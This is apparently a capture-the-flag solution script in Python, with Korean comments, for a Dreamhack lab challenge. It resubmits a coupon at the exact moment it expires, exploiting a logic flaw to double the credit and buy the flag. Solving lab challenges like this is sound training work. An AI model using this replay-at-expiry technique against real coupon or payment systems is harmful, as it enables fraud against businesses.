import time
import requests
#from requests.sessions import session

URL = "http://host1.dreamhack.games:20004/"   #<<--- 포트는...알아서...
couponExpirationTime = 45

# Session 획득하기 (맨 처음)
response = requests.get(URL + "/session")
response = response.json()
sessionVaule = response['session']
print(f"[*] GOT NEW SESSION : {sessionVaule}")

# 쿠폰 Claim 하기
HEADER = {'Authorization':sessionVaule}
response = requests.get(URL + "/coupon/claim", headers=HEADER)
response = response.json()
couponValue = response['coupon']
print(f"[*] GOT NEW COUPON : {couponValue}")

# 쿠폰 Submit 하기
HEADER = {'Authorization':sessionVaule, 'coupon':couponValue}
response = requests.get(URL + "/coupon/submit", headers=HEADER)
print(f"[*] SUBMITTED COUPON... JSONIFIED DATA : {response.json()}")

# couponExpirationTime(45초)만큼만 딱 기다리기
print(f"[*] WAIT FOR ONLY 45.00 SECONDS...")
time.sleep(couponExpirationTime)

# EXPIARY TIME 오차범위 1초만에 Submit 한 번 더 하기(로직 취약점 이용)
HEADER = {'Authorization':sessionVaule, 'coupon':couponValue}
response = requests.get(URL + "/coupon/submit", headers=HEADER)
print(f"[*] **RE**--SUBMITTED COUPON... JSONIFIED DATA : {response.json()}")

print(f"[*] WAITING TIME FINISHED! LET'S BUY FLAG!")

# FLAG 구매 후 내용 출력
HEADER = {'Authorization':sessionVaule}
response = requests.get(URL + "/flag/claim", headers=HEADER)
response = response.json()

print(f"[*] FLAG BOUGHT SUCCESSFULLY! LET'S SEE...!")
print(response)
